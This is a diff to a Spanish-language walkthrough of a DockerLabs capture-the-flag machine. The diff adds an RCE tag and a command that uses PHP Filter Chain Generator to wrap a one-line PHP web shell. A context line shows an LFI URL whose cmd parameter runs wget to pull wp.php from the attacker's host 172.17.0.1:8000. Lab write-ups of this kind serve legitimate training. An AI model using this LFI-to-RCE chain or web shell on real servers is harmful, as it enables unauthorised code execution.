@@ -1,5 +1,5 @@
 #MAQUINA #DOCKERLABS #MEDIO
-#LFI #PHP_WRAPPERS
+#LFI #PHP_WRAPPERS #RCE 
 #ABUSO_SUBIDA_ARCHIVOS 
 <hr>
 
@@ -203,6 +203,7 @@ El **info.php** no debería ser visible, revela mucha info sensible y mucho meno
 Nos descargamos [PHP Filter Chain Generator](https://github.com/synacktiv/php_filter_chain_generator) , ya que podremos colar comandos usándola.
 
 ```bash
+./php_filter_chain_generator.py   --chain  '<?php system($_GET["cmd"]);?>'
 
 http://realgob.dl/about.php?file=<PHP CHAIN>&cmd= cd uploads; wget http://172.17.0.1:8000/wp.php
 
